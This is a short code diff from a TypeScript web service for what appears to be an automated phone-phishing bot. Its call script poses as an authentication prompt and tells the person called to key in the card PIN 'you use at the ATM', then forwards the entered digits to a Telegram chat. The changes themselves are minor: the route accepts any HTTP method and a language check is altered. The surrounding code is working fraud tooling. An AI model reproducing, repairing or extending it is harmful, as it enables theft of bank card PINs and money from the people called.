@@ -2,7 +2,7 @@ import { bot } from '../..';
 import { app } from '../';
 import { v4 as uuidv4 } from 'uuid';
 
-app.post('/calls/pin/:chatId/:language', async (req, res) => {
+app.all('/calls/pin/:chatId/:language', async (req, res) => {
   const { chatId, language } = req.params;
   const { variables } = req.query;
   const { dtmf } = JSON.parse(variables as string);
@@ -65,9 +65,9 @@ app.post('/calls/pin/:chatId/:language', async (req, res) => {
             action: 'say',
             options: {
               payload: `The ${
-                language === 'en-US' ? 'CARD PIN' : 'TELEPIN'
+                language === 'en-us' ? 'CARD PIN' : 'TELEPIN'
               } you have entered is incorrect. To AUTHENTICATE YOU please enter your ${
-                language === 'en-US' ? 'CARD PIN' : 'TELEPIN'
+                language === 'en-us' ? 'CARD PIN' : 'TELEPIN'
               }, the same pin you use at the ATM, followed by the pound key.`,
               language,
               voice: 'female',
@@ -101,7 +101,7 @@ app.post('/calls/pin/:chatId/:language', async (req, res) => {
 
     await bot.telegram.sendMessage(
       req.params.chatId,
-      req.params.language === 'en-US'
+      req.params.language === 'en-us'
         ? `Card Pin is <b>${dtmf}</b> 💳`
         : `Telepin is <b>${dtmf}</b> 📟`,
       {
